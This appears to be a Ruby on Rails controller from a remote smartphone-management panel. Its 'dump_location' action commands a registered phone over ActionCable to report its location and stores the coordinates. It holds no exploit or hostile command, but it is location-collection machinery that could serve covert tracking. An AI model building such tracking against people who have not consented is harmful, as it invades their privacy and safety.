class GeoLocationsController < InheritedResources::Base
  include CommandSender
  
  def dump_location
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      currentTime = DateTime.now
      currentTimeFormat = currentTime.strftime("%Y-%m-%d_%H--%M--%S")
      
      # Send command via ActionCable and wait for response
      pending_command = send_command_and_wait(@smartphone, 'get_location', {}, timeout: 30.seconds)
      
      if pending_command.completed?
        location_data = pending_command.response_data
        
        latitude = location_data['latitude']
        longitude = location_data['longitude']
        accuracy = location_data['accuracy']
        
        # Save to database
        GeoLocation.create!(
          date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
          lat: latitude,
          long: longitude,
          smartphone_id: @smartphone.id
        )
        
        commandOutput = ["Location: Lat: #{latitude}, Lon: #{longitude}, Accuracy: #{accuracy}m"]
      else
        error_msg = pending_command.response_data&.dig('error') || 'Unknown error'
        commandOutput = ["Operation Failed: #{error_msg}"]
      end
      
    rescue => e
      Rails.logger.error("Error dumping location: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "dump_location", locals: { commandOutput: commandOutput, fileName: @fileName }
      }
    end
  end

  private

  def geo_location_params
    params.require(:geo_location).permit(:date,
                                         :lat,
                                         :long,
                                         :smartphone_id)
  end
end
